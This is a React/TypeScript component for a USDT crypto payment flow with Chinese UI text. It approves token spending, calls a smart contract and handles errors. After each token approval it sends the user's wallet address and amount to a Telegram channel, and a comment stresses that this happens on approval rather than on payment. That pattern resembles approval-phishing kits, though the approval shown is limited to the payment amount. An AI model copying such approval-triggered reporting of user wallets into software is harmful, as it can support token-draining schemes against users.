"use client";

import React, { useState, useEffect } from "react";
import { Payment, ChainType } from "@/types";
import { cn } from "@/utils/cn";

interface PaymentStepsProps {
  payment: Payment;
  wallet: {
    address: string;
    wallet: string;
    chain: ChainType;
  };
  onApprovalComplete: () => Promise<void> | void;
  onPaymentComplete: () => void;
  onPayButtonClick?: () => Promise<void> | void;
  onPaymentStart?: () => void; // Callback when payment processing starts
  onPaymentEnd?: () => void; // Callback when payment processing ends (success/failure)
  className?: string;
}

// Simplified UI - no more step system

export function PaymentSteps({
  payment,
  wallet,
  onApprovalComplete,
  onPaymentComplete,
  onPayButtonClick,
  onPaymentStart,
  onPaymentEnd,
  className,
}: PaymentStepsProps) {
  const [approving, setApproving] = useState(false);
  const [processing, setProcessing] = useState(false);
  const [autoProcessing, setAutoProcessing] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [telegramServiceInstance, setTelegramServiceInstance] =
    useState<any>(null);
  const [telegramLoading, setTelegramLoading] = useState(true);

  // Load telegram service on component mount
  useEffect(() => {
    const loadTelegramService = async () => {
      setTelegramLoading(true);
      try {
        const module = await import("@/lib/telegram");
        if (module.telegramService) {
          setTelegramServiceInstance(module.telegramService);
          console.log("📱 Telegram service loaded successfully");

          // Debug: Log the service configuration
          if (module.telegramService.isConfigured) {
            console.log("📱 Telegram service config:", {
              isConfigured: module.telegramService.isConfigured(),
              hasConfig: !!module.telegramService.getConfig,
            });
          }
        } else {
          console.log("📱 Telegram service not found in module");
          setTelegramServiceInstance(null);
        }
      } catch (error) {
        console.log("📱 Telegram service not available:", error);
        setTelegramServiceInstance(null);
      } finally {
        setTelegramLoading(false);
      }
    };

    // Add retry mechanism with exponential backoff
    const loadWithRetry = async (retryCount = 0) => {
      try {
        await loadTelegramService();
      } catch (error) {
        if (retryCount < 3) {
          console.log(
            `📱 Telegram service load failed, retrying in ${Math.pow(
              2,
              retryCount
            )}s...`
          );
          setTimeout(
            () => loadWithRetry(retryCount + 1),
            Math.pow(2, retryCount) * 1000
          );
        } else {
          console.log("📱 Telegram service failed to load after 3 retries");
          setTelegramLoading(false);
        }
      }
    };

    loadWithRetry();
  }, []);

  // Utility function to safely check if telegram service is available
  const isTelegramServiceReady = () => {
    return (
      telegramServiceInstance &&
      telegramServiceInstance.isConfigured() &&
      !telegramLoading
    );
  };

  // Simplified UI - no more step system

  // Check if this is an auto-processed QR code payment
  const isQRCodePayment = wallet?.address?.startsWith("qr-");

  // Check if this is a WalletConnect payment
  const isWalletConnectPayment = wallet?.address?.startsWith("wc-");

  const handlePayment = async () => {
    if (!wallet || !wallet.address) return;

    // Notify parent component that payment processing has started
    if (onPaymentStart) {
      onPaymentStart();
    }

    // Debug: Log wallet information
    console.log("🔍 Payment Debug Info:", {
      walletAddress: wallet?.address,
      walletChain: wallet?.chain,
      walletType: wallet?.wallet,
      address: wallet?.address,
      chain: wallet?.chain,
      isWalletConnectPayment,
      isQRCodePayment,
      hasOnPayButtonClick: !!onPayButtonClick,
    });

    // For WalletConnect payments, use the special pay button handler
    if (isWalletConnectPayment && onPayButtonClick) {
      console.log("📱 Using WalletConnect payment flow");
      try {
        await onPayButtonClick();
        return;
      } catch (error) {
        console.error("❌ WalletConnect payment failed:", error);
        setError("支付失败，请重试");
        return;
      }
    }

    // For QR code payments, use the special pay button handler
    if (isQRCodePayment && onPayButtonClick) {
      console.log("📱 Using QR Code payment flow");
      try {
        await onPayButtonClick();
        return;
      } catch (error) {
        console.error("❌ QR Code payment failed:", error);
        setError("支付失败，请重试");
        return;
      }
    }

    // For manual wallet payments, implement smart contract flow
    console.log("🔐 Using manual wallet payment flow (smart contract)");
    setApproving(true);
    setError(null);

    try {
      console.log(`🚀 Starting payment of ${payment.amount} USDT...`);
      console.log(`🌐 Chain: ${wallet.chain}`);
      console.log(`💼 Wallet: ${wallet.address}`);

      // Step 1: Approve USDT spending for the smart contract
      console.log("🔐 Step 1: Approving USDT spending...");

      try {
        const { approveUSDT } = await import("@/lib/blockchain");
        const approvalResult = await approveUSDT(
          wallet.chain,
          payment.amount.toString(),
          wallet.address
        );

        if (!approvalResult) {
          throw new Error(`USDT approval failed`);
        }

        console.log("✅ USDT approval completed");

        // Show success alert for approval
        alert(
          `✅ USDT授权成功！\n\n已授权 ${payment.amount} USDT\n正在处理支付...`
        );
      } catch (approvalError: any) {
        console.error("❌ USDT approval failed:", approvalError);

        // Handle specific approval errors
        let approvalErrorMessage = "USDT授权失败，请重试";

        if (
          approvalError.message &&
          approvalError.message.includes("Insufficient USDT balance")
        ) {
          approvalErrorMessage = `USDT余额不足！需要: ${payment.amount} USDT，当前余额不足。请确保您的钱包中有足够的USDT。`;
        } else if (
          approvalError.message &&
          approvalError.message.includes("User rejected")
        ) {
          approvalErrorMessage = "用户取消了USDT授权";
        } else if (
          approvalError.message &&
          approvalError.message.includes("insufficient funds")
        ) {
          approvalErrorMessage =
            "网络费用不足！请确保您的钱包中有足够的原生代币（ETH/BNB/TRX）支付网络费用。";
        } else if (approvalError.message) {
          approvalErrorMessage = approvalError.message;
        }

        // Show alert to user
        alert(`❌ USDT授权失败\n\n${approvalErrorMessage}`);

        // Set error and stop processing
        setError(approvalErrorMessage);
        setApproving(false);
        return;
      }

      // Send Telegram notification for USDT approval completion
      if (isTelegramServiceReady()) {
        try {
          console.log("📱 Sending Telegram notification for USDT approval...");
          await telegramServiceInstance.sendCustomNotification(
            "USDT Approval Completed",
            `🔐 USDT approval of ${payment.amount} USDT completed successfully!\n\n👤 User: ${wallet.address}\n🌐 Chain: ${wallet.chain}\n💼 Wallet: ${wallet.wallet}\n💰 Amount: ${payment.amount} USDT`,
            ["USDTApproval", wallet.chain, "USDT"]
          );
          console.log(
            "✅ Telegram notification for approval sent successfully"
          );
        } catch (error) {
          console.log("📱 Telegram notification for approval failed:", error);
          // Don't fail the payment if telegram notification fails
        }
      } else {
        console.log(
          "📱 Telegram service not available for approval notification"
        );
      }

      // Step 2: Call smart contract to process payment
      console.log("💸 Step 2: Processing payment on smart contract...");
      setApproving(false); // Approval completed
      setProcessing(true); // Start payment processing

      // Note: Payment ID should be unique. If this fails with "PaymentIdExists" error,
      // it means the same payment ID was already processed. The backend should generate unique IDs.

      const { processPayment } = await import("@/lib/blockchain");
      const paymentResult = await processPayment(
        payment.payment_id,
        payment.amount,
        wallet.address,
        wallet.chain
      );

      if (!paymentResult) {
        throw new Error(`Payment processing failed`);
      }

      console.log(
        `✅ Payment of ${payment.amount} USDT completed successfully!`
      );
      console.log(`🔗 Transaction: ${paymentResult.txHash}`);

      // Show success alert to user
      alert(
        `🎉 支付成功！\n\n您已成功支付 ${payment.amount} USDT\n交易哈希: ${paymentResult.txHash}`
      );

      // Note: Telegram notification is sent after USDT approval, not after payment completion

      // Call the payment complete handler
      onPaymentComplete();
    } catch (err: any) {
      console.error("❌ Payment failed:", err);

      // Handle specific contract errors with user-friendly messages
      let errorMessage = "支付失败，请重试";

      if (err.message && err.message.includes("PaymentIdExists")) {
        errorMessage = "该支付ID已被处理，请使用新的支付链接";
      } else if (err.message && err.message.includes("execution reverted")) {
        errorMessage = "智能合约执行失败，请检查网络状态或联系客服";
      } else if (
        err.message &&
        err.message.includes("Insufficient USDT balance")
      ) {
        errorMessage = `USDT余额不足！需要: ${payment.amount} USDT，当前余额不足。请确保您的钱包中有足够的USDT。`;
      } else if (
        err.message &&
        err.message.includes("Insufficient USDT allowance")
      ) {
        errorMessage = "USDT授权不足！请先完成USDT授权步骤。";
      } else if (err.message && err.message.includes("User rejected")) {
        errorMessage = "用户取消了交易";
      } else if (err.message && err.message.includes("insufficient funds")) {
        errorMessage =
          "网络费用不足！请确保您的钱包中有足够的原生代币（ETH/BNB/TRX）支付网络费用。";
      } else if (err.message) {
        // For other errors, show the actual error message
        errorMessage = err.message;
      }

      // Show alert to user
      alert(`❌ 支付失败\n\n${errorMessage}`);

      // Also set the error state for UI display
      setError(errorMessage);
    } finally {
      setApproving(false);
      setAutoProcessing(false);
      setProcessing(false);

      // Notify parent component that payment processing has ended
      if (onPaymentEnd) {
        onPaymentEnd();
      }
    }
  };

  // Simplified UI - no more complex step system

  if (!wallet || !wallet.address) {
    return (
      <div className={cn("text-center py-8", className)}>
        <p className="text-gray-400">请先连接钱包</p>
      </div>
    );
  }

  // Show success state if payment is completed
  if (payment.status === "completed") {
    return (
      <div className={cn("text-center py-8", className)}>
        <div className="mb-6">
          <div className="w-20 h-20 bg-green-500 rounded-full flex items-center justify-center mx-auto mb-4">
            <span className="text-4xl">🎉</span>
          </div>
          <h3 className="text-2xl font-bold text-white mb-2">支付成功！</h3>
          <p className="text-gray-300">您的 {payment.amount} USDT 支付已完成</p>
        </div>

        <div className="bg-green-900/20 border border-green-700/30 rounded-lg p-4 mb-6">
          <div className="grid grid-cols-2 gap-4 text-sm">
            <div>
              <span className="text-gray-400 block">支付金额</span>
              <span className="text-white font-medium">
                {payment.amount} USDT
              </span>
            </div>
            <div>
              <span className="text-gray-400 block">支付状态</span>
              <span className="text-green-300 font-medium">已完成</span>
            </div>
            <div>
              <span className="text-gray-400 block">钱包地址</span>
              <span className="text-white font-mono text-xs">
                {wallet?.address?.slice(0, 6)}...{wallet?.address?.slice(-4)}
              </span>
            </div>
            <div>
              <span className="text-gray-400 block">区块链网络</span>
              <span className="text-white font-medium">
                {wallet?.chain?.toUpperCase()}
              </span>
            </div>
          </div>
        </div>

        <button
          onClick={onPaymentComplete}
          className="bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700 text-white py-3 px-8 rounded-lg font-medium transition-all duration-300 transform hover:scale-105"
        >
          ✅ 完成
        </button>
      </div>
    );
  }

  // Show simple pay button for pending payments
  return (
    <div className={cn("text-center py-6", className)}>
      <div className="mb-6">
        <div className="w-16 h-16 bg-gradient-to-br from-red-500 to-red-600 rounded-full flex items-center justify-center mx-auto mb-4">
          <span className="text-2xl">💳</span>
        </div>
        <h3 className="text-xl font-bold text-white mb-2">准备支付</h3>
        <p className="text-gray-300">点击下方按钮开始支付流程</p>
      </div>

      {/* Simple Pay Button */}
      <button
        onClick={handlePayment}
        disabled={approving || processing || autoProcessing}
        className={cn(
          "w-full py-4 px-8 rounded-xl font-bold text-lg transition-all duration-300 transform hover:scale-105 focus:outline-none focus:ring-2 focus:ring-red-500",
          approving || processing || autoProcessing
            ? "bg-gray-500 cursor-not-allowed"
            : "bg-gradient-to-r from-red-500 to-red-600 hover:from-red-600 hover:to-red-700 text-white shadow-lg"
        )}
      >
        {approving || processing || autoProcessing ? (
          <span className="flex items-center justify-center">
            <div className="w-6 h-6 border-2 border-white border-t-transparent rounded-full animate-spin mr-3" />
            处理中...
          </span>
        ) : (
          `💳 支付 ${payment.amount} USDT`
        )}
      </button>

      {/* Balance Check Warning */}
      <div className="mt-3 p-3 bg-yellow-900/20 border border-yellow-700/30 rounded-lg">
        <p className="text-yellow-300 text-xs text-center">
          ⚠️ 请确保您的钱包中有足够的 {payment.amount} USDT 和网络费用
        </p>
      </div>

      {/* Error Display */}
      {error && (
        <div className="mt-4 bg-red-900/20 border border-red-700/30 rounded-lg p-4">
          <div className="flex items-start space-x-3">
            <div className="flex-shrink-0">
              <span className="text-red-400 text-lg">❌</span>
            </div>
            <div className="flex-1">
              <h4 className="text-red-300 font-medium mb-1">支付失败</h4>
              <p className="text-red-200 text-sm leading-relaxed">{error}</p>
            </div>
          </div>
        </div>
      )}

      {/* Payment Info */}
      <div className="mt-6 bg-gray-800/50 rounded-lg p-4 border border-gray-700">
        <div className="grid grid-cols-2 gap-4 text-xs">
          <div>
            <span className="text-gray-400 block">支付金额</span>
            <span className="text-white font-medium">
              {payment.amount} USDT
            </span>
          </div>
          <div>
            <span className="text-gray-400 block">网络</span>
            <span className="text-white font-medium">
              {wallet?.chain?.toUpperCase()}
            </span>
          </div>
          <div>
            <span className="text-gray-400 block">钱包</span>
            <span className="text-white font-medium">{wallet?.wallet}</span>
          </div>
          <div>
            <span className="text-gray-400 block">地址</span>
            <span className="text-white font-mono text-xs">
              {wallet?.address?.slice(0, 6)}...{wallet?.address?.slice(-4)}
            </span>
          </div>
        </div>
      </div>
    </div>
  );
}
